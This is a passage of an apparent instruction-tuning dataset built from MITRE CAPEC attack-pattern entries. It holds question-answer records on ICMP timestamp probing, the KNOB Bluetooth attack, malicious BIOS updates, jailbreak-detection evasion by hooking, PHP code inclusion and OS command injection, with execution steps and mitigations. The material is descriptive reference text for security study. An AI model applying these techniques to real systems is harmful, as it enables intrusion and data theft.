    "instruction": "Give me an usage example for attack pattern - Timestamp Request (CAPEC ID: 295)",
    "context": "",
    "output": "An adversary sends an ICMP type 13 Timestamp Request to determine the time as recorded by a remote target. Timestamp Replies, ICMP Type 14, usually return a value in Greenwich Mean Time. An adversary can attempt to use an ICMP Timestamp requests to 'ping' a remote system to see if is alive. Additionally, because these types of messages are rare they are easily spotted by intrusion detection systems, many ICMP scanning tools support IP spoofing to help conceal the origin of the actual request among a storm of similar ICMP messages. It is a common practice for border firewalls and gateways to be configured to block ingress ICMP type 13 and egress ICMP type 14 messages.\n* An adversary may gather the system time or time zone from a local or remote system. This information may be gathered in a number of ways, such as with Net on Windows by performing net time \\\\hostname to gather the system time on a remote system. The victim's time zone may also be inferred from the current system time or gathered by using w32tm /tz. The information could be useful for performing other techniques, such as executing a file with a Scheduled Task, or to discover locality information based on time zone to assist in victim targeting",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "An adversary sends an ICMP type 13 Timestamp Request to determine the time as recorded by a remote target. Timestamp Replies, ICMP Type 14, usually return a value in Greenwich Mean Time. An adversary can attempt to use an ICMP Timestamp requests to 'ping' a remote system to see if is alive. Additionally, because these types of messages are rare they are easily spotted by intrusion detection systems, many ICMP scanning tools support IP spoofing to help conceal the origin of the actual request among a storm of similar ICMP messages. It is a common practice for border firewalls and gateways to be configured to block ingress ICMP type 13 and egress ICMP type 14 messages.",
        "An adversary may gather the system time or time zone from a local or remote system. This information may be gathered in a number of ways, such as with Net on Windows by performing net time \\\\hostname to gather the system time on a remote system. The victim's time zone may also be inferred from the current system time or gathered by using w32tm /tz. The information could be useful for performing other techniques, such as executing a file with a Scheduled Task, or to discover locality information based on time zone to assist in victim targeting"
      ],
      "@Name": "Timestamp Request (CAPEC ID: 295)",
      "attack_ptrn": {
        "@ID": "295",
        "@Name": "Timestamp Request",
        "@Abstraction": "Detailed",
        "@Status": "Stable",
        "Description": "This pattern of attack leverages standard requests to learn the exact time associated with a target system. An adversary may be able to use the timestamp returned from the target to attack time-based security algorithms, such as random number generators, or time-based authentication mechanisms.",
        "Typical_Severity": "Low",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "292",
            "Exclude_Related": {
              "@Exclude_ID": "512"
            }
          }
        },
        "Prerequisites": {
          "Prerequisite": "The ability to send a timestamp request to a remote target and receive a response."
        },
        "Resources_Required": {
          "Resource": "Scanners or utilities that provide the ability to send custom ICMP queries."
        },
        "Consequences": {
          "Consequence": {
            "Scope": "Confidentiality",
            "Impact": "Other"
          }
        },
        "Example_Instances": {
          "Example": [
            "An adversary sends an ICMP type 13 Timestamp Request to determine the time as recorded by a remote target. Timestamp Replies, ICMP Type 14, usually return a value in Greenwich Mean Time. An adversary can attempt to use an ICMP Timestamp requests to 'ping' a remote system to see if is alive. Additionally, because these types of messages are rare they are easily spotted by intrusion detection systems, many ICMP scanning tools support IP spoofing to help conceal the origin of the actual request among a storm of similar ICMP messages. It is a common practice for border firewalls and gateways to be configured to block ingress ICMP type 13 and egress ICMP type 14 messages.",
            "An adversary may gather the system time or time zone from a local or remote system. This information may be gathered in a number of ways, such as with Net on Windows by performing net time \\\\hostname to gather the system time on a remote system. The victim's time zone may also be inferred from the current system time or gathered by using w32tm /tz. The information could be useful for performing other techniques, such as executing a file with a Scheduled Task, or to discover locality information based on time zone to assist in victim targeting"
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "200"
          }
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1124",
            "Entry_Name": "System Time Discovery"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-33",
              "@Section": "Chapter 2: Scanning, pp. 44-51"
            },
            {
              "@External_Reference_ID": "REF-123"
            },
            {
              "@External_Reference_ID": "REF-124"
            },
            {
              "@External_Reference_ID": "REF-125"
            },
            {
              "@External_Reference_ID": "REF-147",
              "@Section": "Section 3.7.2 ICMP Probe Selection, pg. 70"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Description Summary, Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Attack_Prerequisites, Description Summary, Examples-Instances, References, Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-09-30",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            }
          ],
          "Previous_Entry_Name": {
            "@Date": "2018-07-31",
            "#text": "ICMP Timestamp Request"
          }
        }
      }
    }
  },
  {
    "instruction": "How can I implement attack pattern - Key Negotiation of Bluetooth Attack (KNOB) (CAPEC ID: 668)",
    "context": "",
    "output": "Examples of Key Negotiation of Bluetooth Attack (KNOB) (CAPEC ID: 668) are: Given users Alice, Bob and Charlie (Charlie being the attacker), Alice and Bob begin to agree on an encryption key when connecting. While Alice sends a message to Bob that an encryption key with 16 bytes of entropy should be used, Charlie changes this to 1 and forwards the request to Bob and continues forwarding these packets until authentication is successful.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "Given users Alice, Bob and Charlie (Charlie being the attacker), Alice and Bob begin to agree on an encryption key when connecting. While Alice sends a message to Bob that an encryption key with 16 bytes of entropy should be used, Charlie changes this to 1 and forwards the request to Bob and continues forwarding these packets until authentication is successful.",
      "@Name": "Key Negotiation of Bluetooth Attack (KNOB) (CAPEC ID: 668)",
      "attack_ptrn": {
        "@ID": "668",
        "@Name": "Key Negotiation of Bluetooth Attack (KNOB)",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "An adversary can exploit a flaw in Bluetooth key negotiation allowing them to decrypt information sent between two devices communicating via Bluetooth. The adversary uses an Adversary in the Middle setup to modify packets sent between the two devices during the authentication process, specifically the entropy bits. Knowledge of the number of entropy bits will allow the attacker to easily decrypt information passing over the line of communication.",
        "Likelihood_Of_Attack": "Low",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "115"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "148"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Discovery] Using an established Person in the Middle setup, search for Bluetooth devices beginning the authentication process.",
              "Technique": "Use packet capture tools."
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Change the entropy bits] Upon recieving the initial key negotiation packet from the master, the adversary modifies the entropy bits requested to 1 to allow for easy decryption before it is forwarded."
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Capture and decrypt data] Once the entropy of encryption is known, the adversary can capture data and then decrypt on their device."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "Person in the Middle network setup."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Medium",
            "#text": "Ability to modify packets."
          }
        },
        "Resources_Required": {
          "Resource": "Bluetooth adapter, packet capturing capabilities."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Bypass Protection Mechanism"
            },
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": "Newer Bluetooth firmwares ensure that the KNOB is not negotaited in plaintext. Update your device."
        },
        "Example_Instances": {
          "Example": "Given users Alice, Bob and Charlie (Charlie being the attacker), Alice and Bob begin to agree on an encryption key when connecting. While Alice sends a message to Bob that an encryption key with 16 bytes of entropy should be used, Charlie changes this to 1 and forwards the request to Bob and continues forwarding these packets until authentication is successful."
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "425"
            },
            {
              "@CWE_ID": "285"
            },
            {
              "@CWE_ID": "693"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1565.002",
            "Entry_Name": "Data Manipulation: Transmitted Data Manipulation"
          }
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-657"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2021-06-24"
          },
          "Modification": {
            "Modification_Name": "CAPEC Content Team",
            "Modification_Organization": "The MITRE Corporation",
            "Modification_Date": "2022-09-29",
            "Modification_Comment": "Updated Taxonomy_Mappings"
          }
        }
      }
    }
  },
  {
    "instruction": "What are possible examples for implementing the attack pattern: Altered Installed BIOS (CAPEC ID: 532)",
    "context": "",
    "output": "Possible examples: An attacker compromises the download and update portion of a manufacturer's web presence, and develops a malicious BIOS that in addition to the normal functionality will also at a specific time of day disable the remote access subsystem's security checks. The malicious BIOS is put in place on the manufacturer's website, the victim location is sent an official-looking email informing the victim of the availability of a new BIOS with bug fixes and enhanced performance capabilities to entice the victim to install the new BIOS quickly. The malicious BIOS is downloaded and installed on the victim's system, which allows for additional compromise by the attacker.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "An attacker compromises the download and update portion of a manufacturer's web presence, and develops a malicious BIOS that in addition to the normal functionality will also at a specific time of day disable the remote access subsystem's security checks. The malicious BIOS is put in place on the manufacturer's website, the victim location is sent an official-looking email informing the victim of the availability of a new BIOS with bug fixes and enhanced performance capabilities to entice the victim to install the new BIOS quickly. The malicious BIOS is downloaded and installed on the victim's system, which allows for additional compromise by the attacker.",
      "@Name": "Altered Installed BIOS (CAPEC ID: 532)",
      "attack_ptrn": {
        "@ID": "532",
        "@Name": "Altered Installed BIOS",
        "@Abstraction": "Detailed",
        "@Status": "Stable",
        "Description": "An attacker with access to download and update system software sends a maliciously altered BIOS to the victim or victim supplier/integrator, which when installed allows for future exploitation.",
        "Likelihood_Of_Attack": "Low",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "444",
            "Exclude_Related": {
              "@Exclude_ID": "515"
            }
          }
        },
        "Prerequisites": {
          "Prerequisite": [
            "Advanced knowledge about the installed target system design.",
            "Advanced knowledge about the download and update installation processes.",
            "Access to the download and update system(s) used to deliver BIOS images."
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "High",
            "#text": "Able to develop a malicious BIOS image with the original functionality as a normal BIOS image, but with added functionality that allows for later compromise and/or disruption."
          }
        },
        "Mitigations": {
          "Mitigation": [
            "Deploy strong code integrity policies to allow only authorized apps to run.",
            "Use endpoint detection and response solutions that can automaticalkly detect and remediate suspicious activities.",
            "Maintain a highly secure build and update infrastructure by immediately applying security patches for OS and software, implementing mandatory integrity controls to ensure only trusted tools run, and requiring multi-factor authentication for admins.",
            "Require SSL for update channels and implement certificate transparency based verification.",
            "Sign update packages and BIOS patches.",
            "Use hardware security modules/trusted platform modules to verify authenticity using hardware-based cryptography."
          ]
        },
        "Example_Instances": {
          "Example": "An attacker compromises the download and update portion of a manufacturer's web presence, and develops a malicious BIOS that in addition to the normal functionality will also at a specific time of day disable the remote access subsystem's security checks. The malicious BIOS is put in place on the manufacturer's website, the victim location is sent an official-looking email informing the victim of the availability of a new BIOS with bug fixes and enhanced performance capabilities to entice the victim to install the new BIOS quickly. The malicious BIOS is downloaded and installed on the victim's system, which allows for additional compromise by the attacker."
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": [
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1495",
              "Entry_Name": "Firmware Corruption"
            },
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1542.001",
              "Entry_Name": "Pre-OS Boot:System Firmware"
            }
          ]
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-439"
            },
            {
              "@External_Reference_ID": "REF-716"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-11-09",
              "Modification_Comment": "Updated References, Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated References, Related_Attack_Patterns, Typical_Likelihood_of_Exploit"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-09-30",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Mitigations, References"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            }
          ],
          "Previous_Entry_Name": {
            "@Date": "2015-11-09",
            "#text": "Altered BIOS Installed After Installation"
          }
        }
      }
    }
  },
  {
    "instruction": "How can I implement attack pattern - Root/Jailbreak Detection Evasion via Hooking (CAPEC ID: 660)",
    "context": "",
    "output": "Examples of Root/Jailbreak Detection Evasion via Hooking (CAPEC ID: 660) are: An adversary targets a non-restricted iOS banking application in an attempt to compromise sensitive user data. The adversary creates Objective-C runtime code that always returns \"false\" when checking for the existence of the Cydia application. The malicious code is then dynamically loaded into the application via the DYLD_INSERT_LIBRARIES environment variable. When the banking applications checks for Cydia, the hooked code returns \"false\", so the application assumes the device is stock (i.e. not Jailbroken) and allows it to access the application. However, the adversary has just evaded Jailbreak detection and is now able to glean user credentials and/or transaction details.\n* An adversary targets a mobile voting application on an Android device with the goal of committing voter fraud. Leveraging the Xposed framework, the adversary is able to create and hook Java code into the application that bypasses Root detection methods. When the voting application attempts to detect a Rooted device by checking for commonly known installed packages associated with Rooting, the hooked code removes the suspicious packages before returning to the application. As a result, the application believes the device is stock (i.e. not Rooted) when in actuality this is not the case. Having evading Root detection, the adversary is now able to cast votes for the candidate of their choosing as a variety of different users.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "An adversary targets a non-restricted iOS banking application in an attempt to compromise sensitive user data. The adversary creates Objective-C runtime code that always returns \"false\" when checking for the existence of the Cydia application. The malicious code is then dynamically loaded into the application via the DYLD_INSERT_LIBRARIES environment variable. When the banking applications checks for Cydia, the hooked code returns \"false\", so the application assumes the device is stock (i.e. not Jailbroken) and allows it to access the application. However, the adversary has just evaded Jailbreak detection and is now able to glean user credentials and/or transaction details.",
        "An adversary targets a mobile voting application on an Android device with the goal of committing voter fraud. Leveraging the Xposed framework, the adversary is able to create and hook Java code into the application that bypasses Root detection methods. When the voting application attempts to detect a Rooted device by checking for commonly known installed packages associated with Rooting, the hooked code removes the suspicious packages before returning to the application. As a result, the application believes the device is stock (i.e. not Rooted) when in actuality this is not the case. Having evading Root detection, the adversary is now able to cast votes for the candidate of their choosing as a variety of different users."
      ],
      "@Name": "Root/Jailbreak Detection Evasion via Hooking (CAPEC ID: 660)",
      "attack_ptrn": {
        "@ID": "660",
        "@Name": "Root/Jailbreak Detection Evasion via Hooking",
        "@Abstraction": "Detailed",
        "@Status": "Stable",
        "Description": "An adversary forces a non-restricted mobile application to load arbitrary code or code files, via Hooking, with the goal of evading Root/Jailbreak detection. Mobile device users often Root/Jailbreak their devices in order to gain administrative control over the mobile operating system and/or to install third-party mobile applications that are not provided by authorized application stores (e.g. Google Play Store and Apple App Store). Adversaries may further leverage these capabilities to escalate privileges or bypass access control on legitimate applications. Although many mobile applications check if a mobile device is Rooted/Jailbroken prior to authorized use of the application, adversaries may be able to \"hook\" code in order to circumvent these checks. Successfully evading Root/Jailbreak detection allows an adversary to execute administrative commands, obtain confidential data, impersonate legitimate users of the application, and more.",
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "Very High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "251"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Identify application with attack potential] The adversary searches for and identifies a mobile application that could be exploited for malicious purposes (e.g. banking, voting, or medical applications).",
              "Technique": "Search application stores for mobile applications worth exploiting"
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Develop code to be hooked into chosen target application] The adversary develops code or leverages existing code that will be hooked into the target application in order to evade Root/Jailbreak detection methods.",
              "Technique": [
                "Develop code or leverage existing code to bypass Root/Jailbreak detection methods.",
                "Test the code to see if it works.",
                "Iteratively develop the code until Root/Jailbreak detection methods are evaded."
              ]
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Execute code hooking to evade Root/Jailbreak detection methods] Once hooking code has been developed or obtained, execute the code against the target application to evade Root/Jailbreak detection methods.",
              "Technique": "Hook code into the target application."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "The targeted application must be non-restricted to allow code hooking."
        },
        "Skills_Required": {
          "Skill": [
            {
              "@Level": "High",
              "#text": "Knowledge about Root/Jailbreak detection and evasion techniques."
            },
            {
              "@Level": "Medium",
              "#text": "Knowledge about code hooking."
            }
          ]
        },
        "Resources_Required": {
          "Resource": [
            "The adversary must have a Rooted/Jailbroken mobile device.",
            "The adversary needs to have enough access to the target application to control the included code or file."
          ]
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Integrity",
                "Authorization"
              ],
              "Impact": "Execute Unauthorized Commands",
              "Note": "Through Root/Jailbreak Detection Evasion via Hooking, the adversary compromises the integrity of the application."
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control"
              ],
              "Impact": "Read Data",
              "Note": "An adversary may leverage Root/Jailbreak Detection Evasion via Hooking in order to obtain sensitive information."
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Ensure mobile applications are signed appropriately to avoid code inclusion via hooking.",
            "Inspect the application's memory for suspicious artifacts, such as shared objects/JARs or dylibs, after other Root/Jailbreak detection methods.",
            "Inspect the application's stack trace for suspicious method calls.",
            "Allow legitimate native methods, and check for non-allowed native methods during Root/Jailbreak detection methods.",
            "For iOS applications, ensure application methods do not originate from outside of Apple's SDK."
          ]
        },
        "Example_Instances": {
          "Example": [
            "An adversary targets a non-restricted iOS banking application in an attempt to compromise sensitive user data. The adversary creates Objective-C runtime code that always returns \"false\" when checking for the existence of the Cydia application. The malicious code is then dynamically loaded into the application via the DYLD_INSERT_LIBRARIES environment variable. When the banking applications checks for Cydia, the hooked code returns \"false\", so the application assumes the device is stock (i.e. not Jailbroken) and allows it to access the application. However, the adversary has just evaded Jailbreak detection and is now able to glean user credentials and/or transaction details.",
            "An adversary targets a mobile voting application on an Android device with the goal of committing voter fraud. Leveraging the Xposed framework, the adversary is able to create and hook Java code into the application that bypasses Root detection methods. When the voting application attempts to detect a Rooted device by checking for commonly known installed packages associated with Rooting, the hooked code removes the suspicious packages before returning to the application. As a result, the application believes the device is stock (i.e. not Rooted) when in actuality this is not the case. Having evading Root detection, the adversary is now able to cast votes for the candidate of their choosing as a variety of different users."
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "829"
          }
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1055",
            "Entry_Name": "Process Injection"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-624"
            },
            {
              "@External_Reference_ID": "REF-625"
            },
            {
              "@External_Reference_ID": "REF-626"
            },
            {
              "@External_Reference_ID": "REF-627"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2020-12-17"
          }
        }
      }
    }
  },
  {
    "instruction": "Given the attack pattern: Code Inclusion (CAPEC ID: 175), give me an example instances for this pattern",
    "context": "",
    "output": "Sure. Examples can be: One example of this type of attack pattern is PHP file include attacks where the parameter of an include() function is set by a variable that an attacker is able to control. The result is that arbitrary code could be loaded into the PHP application and executed.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "One example of this type of attack pattern is PHP file include attacks where the parameter of an include() function is set by a variable that an attacker is able to control. The result is that arbitrary code could be loaded into the PHP application and executed.",
      "@Name": "Code Inclusion (CAPEC ID: 175)",
      "attack_ptrn": {
        "@ID": "175",
        "@Name": "Code Inclusion",
        "@Abstraction": "Meta",
        "@Status": "Stable",
        "Description": "An adversary exploits a weakness on the target to force arbitrary code to be retrieved locally or from a remote location and executed. This differs from code injection in that code injection involves the direct inclusion of code while code inclusion involves the addition or replacement of a reference to a code file, which is subsequently loaded by the target and used as part of the code of some application.",
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "Very High",
        "Prerequisites": {
          "Prerequisite": [
            "The target application must include external code/libraries that are executed when the application runs and the adversary must be able to influence the specific files that get included.",
            "The victim must run the targeted application, possibly using the crafted parameters that the adversary uses to identify the code to include."
          ]
        },
        "Resources_Required": {
          "Resource": "The adversary may need the capability to host code modules if they wish their own code files to be included."
        },
        "Example_Instances": {
          "Example": "One example of this type of attack pattern is PHP file include attacks where the parameter of an include() function is set by a variable that an attacker is able to control. The result is that arbitrary code could be loaded into the PHP application and executed."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "829"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": {
            "Modification_Name": "CAPEC Content Team",
            "Modification_Organization": "The MITRE Corporation",
            "Modification_Date": "2017-05-01",
            "Modification_Comment": "Updated Activation_Zone, Attack_Prerequisites, Description Summary, Examples-Instances, Injection_Vector, Payload, Payload_Activation_Impact, Related_Weaknesses, Resources_Required, Typical_Likelihood_of_Exploit"
          }
        }
      }
    }
  },
  {
    "instruction": "How can I implement attack pattern - OS Command Injection (CAPEC ID: 88)",
    "context": "",
    "output": "Examples of OS Command Injection (CAPEC ID: 88) are: A transaction processing system relies on code written in a number of languages. To access this functionality, the system passes transaction information on the system command line.\n* An attacker can gain access to the system command line and execute malicious commands by injecting these commands in the transaction data. If successful, the attacker can steal information, install backdoors and perform other nefarious activities that can compromise the system and its data.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "A transaction processing system relies on code written in a number of languages. To access this functionality, the system passes transaction information on the system command line.",
        "An attacker can gain access to the system command line and execute malicious commands by injecting these commands in the transaction data. If successful, the attacker can steal information, install backdoors and perform other nefarious activities that can compromise the system and its data."
      ],
      "@Name": "OS Command Injection (CAPEC ID: 88)",
      "attack_ptrn": {
        "@ID": "88",
        "@Name": "OS Command Injection",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "In this type of an attack, an adversary injects operating system commands into existing application functions. An application that uses untrusted input to build command strings is vulnerable. An adversary can leverage OS command injection in an application to elevate privileges, execute arbitrary commands and compromise the underlying operating system.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "248"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Identify inputs for OS commands] The attacker determines user controllable input that gets passed as part of a command to the underlying operating system.",
              "Technique": [
                "Port mapping. Identify ports that the system is listening on, and attempt to identify inputs and protocol types on those ports.",
                "TCP/IP Fingerprinting. The attacker uses various software to make connections or partial connections and observe idiosyncratic responses from the operating system. Using those responses, they attempt to guess the actual operating system.",
                "Induce errors to find informative error messages"
              ]
            },
            {
              "Step": "2",
              "Phase": "Explore",
              "Description": "[Survey the Application] The attacker surveys the target application, possibly as a valid and authenticated user",
              "Technique": [
                "Spidering web sites for all available links",
                "Inventory all application inputs"
              ]
            },
            {
              "Step": "3",
              "Phase": "Experiment",
              "Description": "[Vary inputs, looking for malicious results.] Depending on whether the application being exploited is a remote or local one the attacker crafts the appropriate malicious input, containing OS commands, to be passed to the application",
              "Technique": [
                "Inject command delimiters using network packet injection tools (netcat, nemesis, etc.)",
                "Inject command delimiters using web test frameworks (proxies, TamperData, custom programs, etc.)"
              ]
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "[Execute malicious commands] The attacker may steal information, install a back door access mechanism, elevate privileges or compromise the system in some other way.",
              "Technique": "The attacker executes a command that stores sensitive information into a location where they can retrieve it later (perhaps using a different command injection)."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "User controllable input used as part of commands to the underlying operating system."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "High",
            "#text": "The attacker needs to have knowledge of not only the application to exploit but also the exact nature of commands that pertain to the target operating system. This may involve, though not always, knowledge of specific assembly commands for the platform."
          }
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Confidentiality",
                "Integrity",
                "Availability"
              ],
              "Impact": "Execute Unauthorized Commands",
              "Note": "Run Arbitrary Code"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": [
                "Gain Privileges",
                "Bypass Protection Mechanism"
              ]
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Use language APIs rather than relying on passing data to the operating system shell or command line. Doing so ensures that the available protection mechanisms in the language are intact and applicable.",
            "Filter all incoming data to escape or remove characters or strings that can be potentially misinterpreted as operating system or shell commands",
            "All application processes should be run with the minimal privileges required. Also, processes must shed privileges as soon as they no longer require them."
          ]
        },
        "Example_Instances": {
          "Example": {
            "xhtml:p": [
              "A transaction processing system relies on code written in a number of languages. To access this functionality, the system passes transaction information on the system command line.",
              "An attacker can gain access to the system command line and execute malicious commands by injecting these commands in the transaction data. If successful, the attacker can steal information, install backdoors and perform other nefarious activities that can compromise the system and its data."
            ],
            "#text": "See also: A vulnerability in Mozilla Firefox 1.x browser allows an attacker to execute arbitrary commands on the UNIX/Linux operating system. The vulnerability is caused due to the shell script used to launch Firefox parsing shell commands that are enclosed within back-ticks in the URL provided via the command line. This can be exploited to execute arbitrary shell commands by tricking a user into following a malicious link in an external application which uses Firefox as the default browser (e.g. the mail client Evolution on Red Hat Enterprise Linux 4)."
          }
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "78"
            },
            {
              "@CWE_ID": "88"
            },
            {
              "@CWE_ID": "20"
            },
            {
              "@CWE_ID": "697"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "WASC",
            "Entry_ID": "31",
            "Entry_Name": "OS Commanding"
          }
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-543"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Execution_Flow"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Execution_Flow, Related_Weaknesses"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Given the attack pattern: Use of Known Domain Credentials (CAPEC ID: 560), give me an example instances for this pattern",
    "context": "",
